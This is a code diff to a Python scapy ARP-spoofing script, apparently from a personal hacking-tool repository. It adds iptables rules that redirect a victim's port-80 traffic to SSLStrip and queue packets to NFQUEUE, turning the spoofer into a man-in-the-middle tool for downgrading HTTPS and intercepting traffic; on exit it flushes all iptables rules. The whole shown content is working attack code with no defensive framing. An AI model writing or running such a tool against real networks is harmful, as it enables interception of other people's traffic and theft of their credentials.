@@ -17,6 +17,7 @@ import scapy.all as scapy
 import time
 import sys
 import argparse
+import subprocess
 
 
 # Note: Ensure that Port Forwarding is ON! echo 1 > /proc/sys/net/ipv4/ip_forward
@@ -64,8 +65,14 @@ router_ip = args.router
 target_mac = get_mac(target_ip)
 router_mac = get_mac(router_ip)
 
+print("[+] Configuring iptables for SSLStrip... (start with 'sslstrip')")
+subprocess.call(["iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--destination-port", "80", "-j", "REDIRECT",
+                 "--to-port", "10000"])
+subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "0"])
+subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "0"])
+
 packets_sent = 0
-print("Spoofing @ 2s intervals. Use CTRL-C to quit")
+print("[+] Spoofing @ 2s intervals. Use CTRL-C to quit")
 
 try:
     while True:
@@ -79,4 +86,6 @@ try:
 except KeyboardInterrupt:
     print("\n[-] Restoring target ARP tables...")
     undo_spoof(target_ip, router_ip)
+    print("[-] Restoring iptables...")
+    subprocess.call(["iptables", "--flush"])
     print("[=] Complete. Program quitting...")
